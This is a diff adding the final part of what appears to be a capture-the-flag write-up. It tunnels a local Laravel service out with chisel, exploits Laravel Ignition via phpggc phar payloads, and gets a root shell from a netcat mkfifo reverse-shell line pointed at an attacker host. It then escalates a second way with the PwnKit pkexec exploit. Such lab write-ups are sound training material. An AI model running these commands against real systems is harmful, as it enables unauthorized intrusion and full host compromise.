@@ -208,9 +208,103 @@ Running the command ```netstat -tulnp``` we find a webserver listening on port 8
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/65da823a-c1fb-4309-9856-ba8fc393974e)
 
+Lets port forward using chisel
+
+Sent chisel over to the target's machine
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e017691d-82b6-4435-a7ee-e952d245f7d3)
+
+On target’s machine run this
+
+command:```./chisel client <LHOST>:9001 R:8000:127.0.0.1:8000```
+
+On your machine run this
+
+command:```./chisel server -p 9001 --reverse```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e28ee32b-b803-4951-9883-80c5e2efec08)
+
+Now, navigate to the webpage http://127.0.0.1:8000
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/895c6b59-b0f1-46b0-8340-c470ede017d0)
+
+We can see the version of Laravel to be ```Laravel v8 (PHP v7.4.18)```, there's actually a public exploit for this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46367446-ea01-44e1-8694-916fe77b27c2)
+
+You can get the exploit from [here](https://github.com/ambionics/laravel-exploits)
+
+First, we need to clone this [github](https://github.com/ambionics/phpggc.git) repo
+
+command:```git clone https://github.com/ambionics/phpggc.git```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/18e4a834-95d0-47d5-b665-a572400904d7)
+
+Nice, now lets generate our ```exploit.phar``` payload
+
+command:```php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id```
+
+As you can see we are trying to run the ```id``` command, if the command gets executed, it means we have successfully exploited the laravel application
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3dbe1356-c5ea-4237-92d5-610f432621a3)
+
+nice nice, now lets run the exploit
+
+command:```python ../laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exploit.phar```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2adfb693-7232-43db-b88e-8cf704acd7f1)
+
+our exploit ran successfully hehe
+
+Now, lets try to get a reverse shell
+
+command:```php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"```
+
+Ensure you edit the ```LHOST``` and ```LPORT```
+
+Then we run the exploit
+
+command:```python ../laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exploit.phar```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/352de436-2d98-4291-afed-5b948382a728)
+
+cool, we got root shell😎.
+
+Well, that's not all
+
+Let's check out an unintended method to escalate privileges
 
 
+# Unintented Method to Privilege Escalation
 
+Checking for suid binaries
+
+command:```find / -perm -u=s -type f 2>/dev/null```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b614d9a9-5be3-4a58-98ed-ee2da2f70f77)
+
+Well Well, we have ```pkexec```. Lets try the ```pwnkit``` exploit for this
+
+You can downlod the exploit from [here](https://github.com/ly4k/PwnKit/blob/main/PwnKit.c)
+
+Send this over to the target machine and compile
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fab08ef-71b3-4c3d-a1c1-15d50721be4d)
+
+To compile and run
+```
+gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
+./PwnKit
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3634c711-924e-49df-bbf4-a7a18aa2249f)
+
+cool stuff🙃
+
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
